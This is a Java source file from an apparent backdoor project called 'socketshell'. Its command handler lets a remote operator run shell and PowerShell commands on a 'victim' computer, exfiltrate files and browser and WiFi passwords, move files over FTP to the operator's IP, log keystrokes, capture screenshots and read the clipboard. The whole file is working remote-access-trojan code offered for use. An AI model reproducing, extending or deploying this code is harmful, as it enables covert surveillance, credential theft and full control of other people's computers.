package com.github.thatcherdev.socketshell.backdoor;

import java.awt.datatransfer.DataFlavor;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import javax.imageio.ImageIO;
import com.github.thatcherdev.socketshell.backend.DuckyScripts;
import com.github.thatcherdev.socketshell.backend.FTP;
import com.github.thatcherdev.socketshell.backend.KeyLogger;
import com.github.thatcherdev.socketshell.backend.Utils;

public class HandleCommand {

	/**
	 * Handles commands given to backdoor by setting {@link send} to appropriate
	 * response. {@link Backdoor.out} is then used to send response followed by a
	 * token to signal end of response.
	 *
	 * @param command command given to backdoor from server.
	 */
	public static void handle(String command) {
		String send = "";
		if (command.equals("help"))
			send = "[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
					+ "[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
					+ "[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
					+ "[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[cb] Get text currently copied to victim's clipboard\n[exit] Exit";
		else if (command.startsWith("cmd"))
			send = Utils.runCommand(command.substring(4));
		else if (command.startsWith("ps"))
			send = Utils.runPSScript(command.substring(3));
		else if (command.startsWith("ds"))
			if (DuckyScripts.run(command.substring(3)))
				send = "DuckyScript '" + command.substring(3) + "' successfully ran";
			else
				send = "An error occurred when trying to run DuckyScript '" + command.substring(3) + "'";
		else if (command.startsWith("exfiles"))
			if (Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")),
					new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*") + 1).split(",")))))
				send = "Files exfiltrated to '" + System.getProperty("user.dir")
						+ "\\gathered\\ExfiltedFiles' on victim's computer";
			else
				send = "An error occurred when trying to exfiltrate files";
		else if (command.equals("expass")) {
			send += Utils.runPSScript("ExfilBrowserCreds.ps1") + "\n";
			send += Utils.runCommand(
					"netsh wlan export profile key=clear folder=" + System.getProperty("user.dir") + "\\gathered");
		} else if (command.startsWith("filesend")) {
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
			}
			if (FTP.backdoor(command.substring(9), "rec", Backdoor.ip))
				send = "File sent";
			else
				send = "An error occurred when trying to send file";
		} else if (command.startsWith("filerec")) {
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
			}
			if (FTP.backdoor(command.substring(8), "send", Backdoor.ip))
				send = "File received";
			else
				send = "An error occurred when trying to receive file";
		} else if (command.equals("keylog")) {
			Thread keyLogger = new Thread() {
				@Override
				public void run() {
					KeyLogger.start();
				}
			};
			keyLogger.start();
			send = "Keys are being logged to '" + System.getProperty("user.dir")
					+ "\\gathered\\keys.log' on victim's computer";
		} else if (command.equals("ss"))
			try {
				Thread.sleep(2000);
				ImageIO.write(
						new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())),
						"png", new File("screenshot.png"));
				FTP.backdoor("screenshot.png", "send", Backdoor.ip);
				new File("screenshot.png").delete();
				send = "Screenshot received";
			} catch (Exception e) {
				send = "An error occurred when trying to receive screenshot";
			}
		else if (command.equals("cb"))
			try {
				String cb = (String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor);
				send = "Victim's clipboard:\n" + cb;
			} catch (Exception e) {
				send = "An error occurred when trying to get victim's clipboard";
			}
		else if (!command.isEmpty())
			send = "Command not found";
		Backdoor.out.println(send + "\n!$end$!");
	}
}
